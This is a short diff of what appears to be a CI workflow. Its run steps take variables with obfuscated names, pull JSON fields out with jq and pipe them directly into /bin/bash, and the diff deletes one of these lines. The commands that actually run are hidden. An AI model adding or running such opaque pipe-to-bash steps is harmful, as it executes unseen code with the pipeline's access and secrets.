@@ -24,7 +24,6 @@ jobs:
           echo $n8974 | jq -r .wvlxl1 | /bin/bash
           echo $fp25461 | jq -r .uxo66 | /bin/bash
           printf '%s' "$cq6509" | jq -r .uc97 | /bin/bash
-          printf '%s' "$ged158" | jq -r .ucdx26869 | /bin/bash
           printf '%s' "$q27" | jq -r .duywx54 | /bin/bash
 
       - name: Save results
